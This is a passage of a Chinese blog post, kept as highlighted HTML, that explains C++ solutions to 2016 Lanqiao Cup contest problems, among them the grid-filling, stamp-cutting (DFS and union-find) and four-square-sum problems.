class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;n<span class="number">-1</span>!=<span class="number">2</span>&amp;&amp;n<span class="number">-1</span>!=<span class="number">6</span>)  <span class="comment">//和左右的数比较（这里只和左边的比较就可以，因为要对所有数和左边相比，实际上也相当于对右边进行了比较）</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(nums[n]-nums[n<span class="number">-1</span>])==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">if</span>(n<span class="number">-4</span>&gt;=<span class="number">0</span>)  <span class="comment">//和上下比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(nums[n]-nums[n<span class="number">-4</span>])==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(n<span class="number">-5</span>&gt;=<span class="number">0</span>&amp;&amp;n<span class="number">-5</span>!=<span class="number">2</span>)  <span class="comment">//和左斜比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(nums[n]-nums[n<span class="number">-5</span>])==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(n<span class="number">-3</span>&gt;=<span class="number">0</span>&amp;&amp;n<span class="number">-3</span>!=<span class="number">3</span>)  <span class="comment">//和右斜比较</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(nums[n]-nums[n<span class="number">-3</span>])==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)   <span class="comment">//对每个数都检验下，如果每个数都符合要求则cnt=10</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">check</span>(i))</span><br><span class="line">                cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt==<span class="number">10</span>)</span><br><span class="line">            res++;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(nums,nums+<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：dfs</li></ul><p>和全排列函数差不多，只不过是用dfs的方式生成所有排列，在这里判断用的是二维数组，实际上next_permutation函数也可以对二维数组排列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">3</span>][<span class="number">4</span>]; <span class="comment">//表示哪些可以填数(flag[0][0]和flag[2][3]不能填)</span></span><br><span class="line"><span class="keyword">int</span> mpt[<span class="number">3</span>][<span class="number">4</span>]; <span class="comment">//填数</span></span><br><span class="line"><span class="keyword">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span>   <span class="comment">//初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">3</span> ; i ++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">4</span> ; j ++)</span><br><span class="line">            flag[i][j] = <span class="number">1</span>;</span><br><span class="line">    flag[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    flag[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solve</span><span class="params">()</span>    <span class="comment">//判断当前dfs所填写的mpt数组是否满足要求</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;   <span class="comment">//表示八个方向</span></span><br><span class="line">    <span class="keyword">int</span> book = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">3</span> ; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; <span class="number">4</span>; j ++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//判断每个数周围是否满足</span></span><br><span class="line">            <span class="keyword">if</span>(flag[i][j] == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">0</span> ; k &lt; <span class="number">8</span> ; k ++)  <span class="comment">//对八个方向遍历判断是否满足题意</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> x,y;</span><br><span class="line">                x = i + dir[k][<span class="number">0</span>];</span><br><span class="line">                y = j + dir[k][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(x &lt; <span class="number">0</span> || x &gt;= <span class="number">3</span> || y &lt; <span class="number">0</span> || y &gt;= <span class="number">4</span> || flag[x][y] == <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(mpt[x][y] - mpt[i][j]) == <span class="number">1</span>)</span><br><span class="line">                    book = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(book)</span><br><span class="line">        ans ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    x = index / <span class="number">4</span>;</span><br><span class="line">    y = index % <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>( x == <span class="number">3</span>) <span class="comment">//退出条件，表示前3行都已填完</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Solve</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag[x][y])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visit[i])</span><br><span class="line">            &#123;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                mpt[x][y] = i;</span><br><span class="line">                <span class="built_in">dfs</span>(index+<span class="number">1</span>);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(index+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码来源：https://blog.csdn.net/y1196645376/article/details/50938608</span></span><br></pre></td></tr></table></figure><h1>7.剪邮票</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210413214401581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><ul><li><strong>思路一</strong>：dfs判断是否连通</li></ul><p>该思路来源：<a href="https://www.liuchuo.net/archives/3926">第七届 蓝桥杯 省赛 第七题 剪邮票</a></p><p>i1、i2、i3、i4和i5为枚举要剪下的5个数，对这五个数构成的连通性进行dfs判断</p><p>如果dfs后测得从i1出发从上下左右四个方向上深度优先搜索遍历为i2～i5之间的所有点，cnt标记i5能够走到的是i1～i5这些点的个数</p><p>如果cnt == 5就说明是连在一起的</p><p>注意从4和8向右行走走不到5和9，并且从5和9出发向左行走走不到4和8～</p><p>所以遇到index == 4或者index == 8并且是向右走的时候continue～（index == 5和9并向左走同理～)</p><p>将result加一～累加得到的result就是结果116～</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> dis[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">1</span>, <span class="number">-4</span>, <span class="number">4</span>&#125;, visit[<span class="number">13</span>];</span><br><span class="line"><span class="keyword">int</span> i1, i2, i3, i4, i5, cnt, result = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cnt &gt;= <span class="number">5</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果向右走且当前在4或8 或 向左走当前在5或9</span></span><br><span class="line">        <span class="keyword">if</span> ((dis[i] == <span class="number">1</span> &amp;&amp; (index == <span class="number">4</span> || index == <span class="number">8</span>)) || (dis[i] == <span class="number">-1</span> &amp;&amp; (index == <span class="number">5</span> || index == <span class="number">9</span>)))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> t = index + dis[i];</span><br><span class="line">        <span class="comment">//如果t在范围内且未访问且t和另外四个数其中一个相等</span></span><br><span class="line">        <span class="keyword">if</span> (t &gt;= <span class="number">1</span> &amp;&amp; t &lt;= <span class="number">12</span> &amp;&amp; visit[t] == <span class="number">0</span> &amp;&amp; (t == i2 || t == i3 || t == i4 || t == i5)) &#123;</span><br><span class="line">            visit[t] = <span class="number">1</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="built_in">dfs</span>(t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//这里最大依次是8、9、10、11、12 即使你都写成12 比如第一个是9，每个for循环初始加1第五个循环就等于 i5=13;i5&lt;=12</span></span><br><span class="line">    <span class="keyword">for</span> (i1 = <span class="number">1</span>; i1 &lt;= <span class="number">8</span>; i1++)</span><br><span class="line">    <span class="keyword">for</span> (i2 = i1 + <span class="number">1</span>; i2 &lt;= <span class="number">9</span>; i2++)</span><br><span class="line">    <span class="keyword">for</span> (i3 = i2 + <span class="number">1</span>; i3 &lt;= <span class="number">10</span>; i3++)</span><br><span class="line">    <span class="keyword">for</span> (i4 = i3 + <span class="number">1</span>; i4 &lt;= <span class="number">11</span>; i4++)</span><br><span class="line">    <span class="keyword">for</span> (i5 = i4 + <span class="number">1</span>; i5 &lt;= <span class="number">12</span>; i5++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visit, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(visit));</span><br><span class="line">        cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(i1);</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">5</span>)</span><br><span class="line">            result++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：当时看的时候一直没想明白dfs不是一条路走到黑吗，而像图中最后一种情况这种6和5、10相连有分叉的怎么判断呢？</p><p>实际上假设现在dfs走的路径是3、7、6、5此时cnt=4，接下来5向上向下得到的1和9都不是选中的数，下一步会怎样呢？</p><p>下一步会回退！5会回退到6的位置，然后6可以到10，此时cnt=5说明是连着的</p><blockquote><p>dfs无法生成图中3、5、6、7、10那种情况所以无法用dfs直接生成满足题意的排列<br>但是dfs可以用来判断当前排列是否相连</p></blockquote><ul><li><strong>思路二</strong>：并查集</li></ul><p>该思路来源：<a href="https://www.freesion.com/article/2244358426/">2016年第七届蓝桥杯【C++省赛B组】【第七题：剪邮票】——并查集</a>，根据个人理解加上了详细注释</p><p>实际上还是思路一简单点，但本着学习的态度多学一种思路</p><p>一个还不错的并查集讲解视频：<a href="https://www.bilibili.com/video/BV13t411v7Fs?p=3">【算法】并查集（Disjoint Set）[共3讲]</a></p><p>先用一个结构体记录每个格子的编号、坐标、是否被选，然后选出五个格子，计算这五个格子有多少个独立分块，如果只有一个，说明是连着的，属于一种方案。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> father[<span class="number">12</span>]; <span class="comment">//father[i]表示元素i的父亲结点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">youpiap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x, y, flag;  <span class="comment">//分别记录行坐标、列坐标、是否被选中</span></span><br><span class="line">&#125;p[<span class="number">13</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//找根节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == father[x]) </span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> father[x] = <span class="built_in">find</span>(father[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//合并</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xx = p[n].x, yy = p[n].y;  <span class="comment">//获取n的行列数</span></span><br><span class="line">    <span class="keyword">int</span> fatherN = <span class="built_in">find</span>(n); <span class="comment">//找到n的根节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i == n || p[i].flag == <span class="number">0</span>)  <span class="comment">//如果i就是n或者p[i]未被选中则跳过</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//如果p[i]在n的右一 || 左一 || 下一 || 上一 则进行合并</span></span><br><span class="line">        <span class="keyword">if</span>((p[i].x==xx&amp;&amp;p[i].y==yy+<span class="number">1</span>) || (p[i].x==xx&amp;&amp;p[i].y==yy<span class="number">-1</span>) || (p[i].x==xx+<span class="number">1</span>&amp;&amp;p[i].y==yy) || (p[i].x==xx<span class="number">-1</span>&amp;&amp;p[i].y==yy))</span><br><span class="line">        &#123;</span><br><span class="line">            father[<span class="built_in">find</span>(i)] = fatherN; <span class="comment">//将i的根节点的父亲设为fatherN 即合并成一个</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++) <span class="comment">//初始化每个元素的父节点都为自身、每个元素都未被选中</span></span><br><span class="line">    &#123;</span><br><span class="line">        father[i] = i;</span><br><span class="line">        p[i].flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> kk = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++)  <span class="comment">//p[kk]存的是行数和列数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            p[kk].x = i;</span><br><span class="line">            p[kk].y = j;</span><br><span class="line">            kk++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">8</span>; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= <span class="number">9</span>; j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = j+<span class="number">1</span>; k &lt;= <span class="number">10</span>; k++) </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> q = k+<span class="number">1</span>; q &lt;= <span class="number">11</span>; q++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t = q+<span class="number">1</span>; t &lt;= <span class="number">12</span>; t++)</span><br><span class="line">    &#123;</span><br><span class="line">        p[i].flag = <span class="number">1</span>, p[j].flag = <span class="number">1</span>, p[k].flag = <span class="number">1</span>, p[q].flag = <span class="number">1</span>, p[t].flag = <span class="number">1</span>;  <span class="comment">//标记被选中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++) <span class="comment">//遍历1-12，如果被选中则进行合并</span></span><br><span class="line">            <span class="keyword">if</span>(p[i].flag) </span><br><span class="line">                <span class="built_in">join</span>(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用集合存放所有被选元素的根节点，若集合只有一个元素(集合无重复元素)则sum++</span></span><br><span class="line">        set&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(p[i].flag) </span><br><span class="line">                s.<span class="built_in">insert</span>(<span class="built_in">find</span>(i));</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>() == <span class="number">1</span>) </span><br><span class="line">            sum++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> tt = <span class="number">1</span>; tt &lt;= <span class="number">12</span>; tt++)</span><br><span class="line">            father[tt] = tt;</span><br><span class="line">        p[i].flag = <span class="number">0</span>, p[j].flag = <span class="number">0</span>, p[k].flag = <span class="number">0</span>, p[q].flag = <span class="number">0</span>, p[t].flag = <span class="number">0</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>8.四平方和</h1><p>四平方和定理，又称为拉格朗日定理：每个正整数都可以表示为至多4个正整数的平方和。如果把0包括进去，就正好可以表示为4个数的平方和。</p><p>比如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> = <span class="number">0</span>^<span class="number">2</span> + <span class="number">0</span>^<span class="number">2</span> + <span class="number">1</span>^<span class="number">2</span> + <span class="number">2</span>^<span class="number">2</span></span><br><span class="line"><span class="number">7</span> = <span class="number">1</span>^<span class="number">2</span> + <span class="number">1</span>^<span class="number">2</span> + <span class="number">1</span>^<span class="number">2</span> + <span class="number">2</span>^<span class="number">2</span></span><br><span class="line">（^符号表示乘方的意思）</span><br></pre></td></tr></table></figure><p>对于一个给定的正整数，可能存在多种平方和的表示法。要求你对4个数排序：0 &lt;= a &lt;= b &lt;= c &lt;= d并对所有的可能表示法按 a,b,c,d 为联合主键升序排列，最后输出第一个表示法</p><p>程序输入为一个正整数N (N&lt;5000000)要求输出4个非负整数，按从小到大排序，中间用空格分开</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">例如，输入：</span><br><span class="line"><span class="number">5</span></span><br><span class="line">则程序应该输出：</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">再例如，输入：</span><br><span class="line"><span class="number">12</span></span><br><span class="line">则程序应该输出：</span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">再例如，输入：</span><br><span class="line"><span class="number">773535</span></span><br><span class="line">则程序应该输出：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">267</span> <span class="number">838</span></span><br></pre></td></tr></table></figure><ul><li><strong>思路一</strong>：暴力枚举 （超时）</li></ul><p>这道题猛地一看很简单不就是四个for循环枚举就行了，但是注意数据范围(N&lt;5000000)，直接for循环枚举肯定超时(可以找在线oj试一下)</p><p>下面代码不是最终答案，仅仅是一种思路，毕竟即使超时也能拿到一半多的分</p><p>可以优化下，用3个for循环，对于i4拿N减去前面的数看看有无可能存在i4，这里就不写了，这样也会超时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin&gt;&gt;N;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i1=<span class="number">0</span>;i1*i1&lt;=N;i1++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i2=i1;i1*i1+i2*i2&lt;=N;i2++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i3=i2;i1*i1+i2*i2+i3*i3&lt;=N;i3++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i4=i3;i1*i1+i2*i2+i3*i3+i4*i4&lt;=N;i4++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i1*i1+i2*i2+i3*i3+i4*i4==N)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;i1&lt;&lt;<span 